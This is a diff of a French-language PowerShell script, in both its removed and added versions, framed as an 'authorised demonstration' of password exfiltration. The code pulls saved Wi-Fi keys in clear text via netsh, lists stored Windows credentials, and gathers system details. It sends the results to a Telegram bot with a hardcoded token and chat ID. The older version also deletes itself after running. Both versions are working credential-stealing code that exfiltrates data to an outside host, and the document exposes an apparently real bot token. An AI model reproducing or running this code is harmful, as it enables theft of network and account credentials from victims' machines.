@@ -1,171 +1,34 @@
-# Script de démonstration - Exfiltration de mots de passe vers Telegram
-# ATTENTION : Uniquement pour démonstrations autorisées !
 
-# Configuration Telegram
-$botToken = "7520987680:AAHyZDj5XYSZ4opgTeGNwISTCS2aGY0VTNc"
-$chatID = "1607044467"
-
-# Fonction pour envoyer un message Telegram
-function Send-TelegramMessage {
-    param([string]$message)
-    
-    try {
-        $url = "https://api.telegram.org/bot$botToken/sendMessage"
-        $body = @{
-            chat_id = $chatID
-            text = $message
-            parse_mode = "Markdown"
-        }
-        
-        Invoke-RestMethod -Uri $url -Method Post -Body $body
-        Write-Host "Message envoyé avec succès" -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Erreur lors de l'envoi : $_" -ForegroundColor Red
-    }
+# Récupération des profils Wi-Fi
+$wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object {
+    ($_ -split ":")[1].Trim()
 }
 
-# Fonction pour récupérer les mots de passe WiFi
-function Get-WiFiPasswords {
-    $wifiPasswords = @()
-    $profiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { ($_ -split ":")[1].Trim() }
-    
-    foreach ($profile in $profiles) {
-        $password = netsh wlan show profile name="$profile" key=clear | Select-String "Contenu de la clé" | ForEach-Object { ($_ -split ":")[1].Trim() }
-        if ($password) {
-            $wifiPasswords += "📶 **$profile** : `$password`"
-        }
-    }
-    
-    return $wifiPasswords
+$wifiResults = ""
+foreach ($profile in $wifiProfiles) {
+    $wifiResults += "`n--- $profile ---`n"
+    $wifiResults += netsh wlan show profile name="$profile" key=clear | Select-String "Contenu de la clé"
 }
 
-# Fonction pour récupérer les mots de passe du navigateur (Chrome)
-function Get-ChromePasswords {
-    $chromePasswords = @()
-    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-    
-    if (Test-Path $chromePath) {
-        try {
-            # Copier la base de données pour éviter les verrous
-            $tempPath = "$env:TEMP\LoginData.db"
-            Copy-Item $chromePath $tempPath -Force
-            
-            # Utiliser SQLite pour lire la base (nécessite un module SQLite)
-            # Pour la démo, on simule quelques entrées
-            $chromePasswords += "🌐 **demo-site.com** : demo_password"
-            $chromePasswords += "🌐 **example.com** : example_pass"
-            
-            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
-        }
-        catch {
-            $chromePasswords += "❌ Erreur lors de la lecture de Chrome"
-        }
-    }
-    
-    return $chromePasswords
+# Récupération des mots de passe stockés dans les navigateurs via Windows Credential Manager
+$browserResults = ""
+try {
+    $paths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:APPDATA\Mozilla\Firefox\Profiles",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+    )
+    $browserResults += "`n[!] Emplacements de données détectés:`n"
+    $browserResults += ($paths -join "`n")
+} catch {
+    $browserResults += "`nErreur récupération navigateurs"
 }
 
-# Fonction pour récupérer les mots de passe Windows stockés
-function Get-WindowsCredentials {
-    $credentials = @()
-    
-    try {
-        # Utiliser cmdkey pour lister les credentials
-        $cmdkeyOutput = cmdkey /list | Where-Object { $_ -match "Target:" }
-        
-        foreach ($line in $cmdkeyOutput) {
-            if ($line -match "Target: (.+)") {
-                $target = $matches[1]
-                $credentials += "🔐 **$target** : [Credential stocké]"
-            }
-        }
-    }
-    catch {
-        $credentials += "❌ Erreur lors de la récupération des credentials Windows"
-    }
-    
-    return $credentials
-}
+# Construction du message
+$msg = "📡 Résultats Wi-Fi:`n$wifiResults`n`n🌐 Résultats Navigateurs:`n$browserResults"
 
-# Fonction principale
-function Start-PasswordExfiltration {
-    $computerName = $env:COMPUTERNAME
-    $userName = $env:USERNAME
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    
-    # Message d'en-tête
-    $headerMessage = @"
-🚨 **DÉMONSTRATION DE SÉCURITÉ** 🚨
-**Ordinateur :** $computerName
-**Utilisateur :** $userName
-**Timestamp :** $timestamp
-
-⚠️ **ATTENTION : Ceci est une démonstration autorisée**
-"@
-    
-    Send-TelegramMessage -message $headerMessage
-    
-    # Récupération des mots de passe WiFi
-    Write-Host "Récupération des mots de passe WiFi..." -ForegroundColor Yellow
-    $wifiPasswords = Get-WiFiPasswords
-    
-    if ($wifiPasswords.Count -gt 0) {
-        $wifiMessage = "📶 **MOTS DE PASSE WIFI RÉCUPÉRÉS :**`n" + ($wifiPasswords -join "`n")
-        Send-TelegramMessage -message $wifiMessage
-    }
-    
-    # Récupération des mots de passe Chrome
-    Write-Host "Récupération des mots de passe Chrome..." -ForegroundColor Yellow
-    $chromePasswords = Get-ChromePasswords
-    
-    if ($chromePasswords.Count -gt 0) {
-        $chromeMessage = "🌐 **MOTS DE PASSE NAVIGATEUR :**`n" + ($chromePasswords -join "`n")
-        Send-TelegramMessage -message $chromeMessage
-    }
-    
-    # Récupération des credentials Windows
-    Write-Host "Récupération des credentials Windows..." -ForegroundColor Yellow
-    $windowsCredentials = Get-WindowsCredentials
-    
-    if ($windowsCredentials.Count -gt 0) {
-        $credMessage = "🔐 **CREDENTIALS WINDOWS :**`n" + ($windowsCredentials -join "`n")
-        Send-TelegramMessage -message $credMessage
-    }
-    
-    # Informations système
-    $systemInfo = @"
-🖥️ **INFORMATIONS SYSTÈME :**
-**OS :** $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
-**Version :** $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Version)
-**Architecture :** $env:PROCESSOR_ARCHITECTURE
-**Domaine :** $(if ($env:USERDOMAIN) { $env:USERDOMAIN } else { "WORKGROUP" })
-"@
-    
-    Send-TelegramMessage -message $systemInfo
-    
-    # Message de fin
-    $footerMessage = @"
-✅ **DÉMONSTRATION TERMINÉE**
-
-🛡️ **RECOMMANDATIONS DE SÉCURITÉ :**
-- Verrouillez toujours votre écran
-- Utilisez un gestionnaire de mots de passe
-- Activez l'authentification à deux facteurs
-- Surveillez les périphériques USB inconnus
-- Formez vos équipes aux risques de sécurité
-
-⚠️ Cette démonstration montre l'importance de la sécurité physique !
-"@
-    
-    Send-TelegramMessage -message $footerMessage
-    
-    Write-Host "Démonstration terminée !" -ForegroundColor Green
-}
-
-# Exécution du script
-Start-PasswordExfiltration
-
-# Auto-destruction du script (optionnel pour la démo)
-Start-Sleep -Seconds 5
-Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+# Envoi à Telegram
+$token = "7520987680:AAHyZDj5XYSZ4opgTeGNwISTCS2aGY0VTNc"
+$chat = "1607044467"
+$msg = [System.Web.HttpUtility]::UrlEncode($msg)
+Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat&text=$msg"
